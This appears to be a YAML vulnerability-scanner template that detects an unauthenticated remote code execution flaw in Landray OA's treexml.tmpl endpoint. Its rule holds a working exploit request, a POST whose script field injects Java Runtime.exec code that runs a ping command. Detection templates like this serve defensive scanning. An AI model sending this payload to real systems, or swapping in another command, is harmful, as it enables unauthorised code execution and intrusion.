id: landray-oa-treexml-rce

info:
  name: Landray OA treexml.tmpl script 远程代码执行漏洞
  author: zhizhuo
  severity: high
  description: |
    蓝凌OA未授权远程代码执行
  reference: 
    - https://github.com/tangxiaofeng7/Landray-OA-Treexml-Rce

set:
  reverse: newReverse()
  reverseURL: reverse.url.host
rules:
  r0:
    request:
      method: POST
      path: /data/sys-common/treexml.tmpl
      headers:
        Host: 127.0.0.1
      body: s_bean=ruleFormulaValidate&script=try {String cmd = "ping www.baidu.com";Process child = Runtime.getRuntime().exec(cmd);} catch (IOException e) {System.err.println(e);}
    expression: response.status == 200 && response.body.bcontains(b'<RestResponse><success>true</success><data><message>')
expression: r0()